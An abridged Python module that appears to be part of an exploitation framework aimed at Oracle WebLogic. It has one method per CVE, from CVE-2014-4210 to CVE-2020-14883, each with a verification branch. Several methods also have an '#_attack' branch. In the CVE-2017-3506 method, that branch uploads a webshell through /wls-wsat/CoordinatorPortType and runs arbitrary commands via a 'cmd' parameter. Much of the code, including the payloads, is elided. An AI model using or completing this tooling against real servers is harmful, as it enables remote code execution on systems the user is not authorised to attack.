...
#        self.payload_cve_2020_2555 = '%s%s' % ('{:08x}'.format(len(self.payload_cve_2020_2555) // 2 + 4), self.payload_cve_2020_2555)
    ...
    def cve_2014_4210(self):
        ...
        pocname = 'Oracle Weblogic: CVE-2014-4210'
        path = '/uddiexplorer/'
        method = 'get'
        info = '[ssrf]'
        #输出类
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=False)
    ...
    def cve_2017_3506(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2017-3506"
        ...
        try:
            ...
            if self.vuln == 'False':
                request = exprequest.post(self.url+"/wls-wsat/CoordinatorPortType", 
                    data=self.payload_cve_2017_3506_poc, headers=self.headers, timeout=self.timeout, verify=False)
                
                req = exprequest.get(self.url+"/wls-wsat/test.log", headers=self.headers, timeout=self.timeout, verify=False)
                if ':-)' in req.text:
                    output.no_echo_success(method, info)
                    self.status = 'success'
                else:
            ...
            #_attack
                ...
                exprequest.post(self.url+"/wls-wsat/CoordinatorPortType", data=payload, headers=self.headers, timeout=self.timeout, verify=False)
                shellpath = self.url+"/wls-wsat/"+filename+"?pwd=password&cmd="+self.cmd
                request = exprequest.get(shellpath, headers=self.headers, timeout=self.timeout, verify=False)
    ...
    def cve_2017_10271(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2017-10271"
        ...
        try:
            ...
            if self.vuln == 'False':
                request = exprequest.post(self.url + "/wls-wsat/CoordinatorPortType", 
                    data=self.payload_cve_2017_10271_rce, headers=headers_rce, timeout=self.timeout, verify=False)
            ...
            #_attack
                ...
                exprequest.post(self.url+path, data=exp, headers=self.headers, timeout=self.timeout, verify=False)
    ...
    def cve_2018_2894(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2018-2894"
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload1, headers=self.headers, timeout=self.timeout, verify=False)
    ...
    def cve_2019_2725(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2019-2725"
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url + "/console", headers=self.headers, timeout=self.timeout, verify=False)
                ...
                if r"VuLnEcHoPoCSuCCeSS" in request.text:        
                    output.no_echo_success(method, info)
                    self.status = 'success'
                else:
                    output.fail()
    ...
    def cve_2019_2729(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2019-2729"
        path = "/wls-wsat/CoordinatorPortType"
        method = 'post'
        headers = {
        ...
        try:
            ...
            if self.vuln == 'False':
                request = exprequest.post(self.url+path, data=self.payload_cve_2019_2729, headers=headers,
                                         timeout=self.timeout, verify=False)
                if "VuLnEcHoPoCSuCCeSS" in request.text:
                    output.echo_success(method, appName)
                    self.status = 'success'
                else:
                    output.fail()
            #_attack
    ...
    def cve_2020_2551(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2020-2551"
        path = "/wls-wsat/CoordinatorPortType"
        method = 'iiop'
    ...
    def cve_2020_2555(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2020-2555"
        method = 'giop'
        ...
        try:
            ...
            #_attack
                ...
                output.no_echo_success(method, r)
        except Exception as error:
            output.error_output(str(error))
    ...
    def cve_2020_2883(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle Weblogic: CVE-2020-2883"
        method = 'giop'
    ...
    def cve_2020_14882(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle WebLogic: CVE-2020-14882"
        method = 'post'
    ...
    def cve_2020_14883(self):
        appName = 'Oracle Weblogic'
        pocname = "Oracle WebLogic: CVE-2020-14883"
        method = 'get'
        dnslog = Dnslog()
...
def check(**kwargs):
    ...
    if kwargs['pocname'] != 'ALL':
        ...
        func()#调用函数
        return ExpOracleWeblogic.status
    else:#调用所有函数
        for func in dir(OracleWeblogic):
            if not func.startswith("__"):
                methodcaller(func)(ExpOracleWeblogic)
                result_list.append(func+' -> '+ExpOracleWeblogic.status)
                ExpOracleWeblogic.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)
